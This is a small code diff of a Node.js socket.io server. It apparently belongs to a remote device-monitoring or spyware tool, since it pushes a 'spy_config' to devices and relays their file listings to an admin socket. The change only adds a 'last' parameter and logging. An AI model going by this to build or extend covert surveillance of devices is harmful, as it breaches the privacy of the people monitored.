@@ -96,10 +96,11 @@ socket.on("spy_config", (status, too) => {
     io.to(device_secure_ids[too]).emit("spy_config", status);
  }
  });
-  socket.on("new_files", (list, typ,size) => {
+  socket.on("new_files", (list, typ,size,last) => {
     console.log(list);
-    console.log(size)
-    io.to(admin_socket_id).emit("new_dir", list, typ,size);
+    console.log(size);
+console.log(last);
+    io.to(admin_socket_id).emit("new_dir", list, typ,size,last);
   });
 
   socket.on("empty_dir", () => {
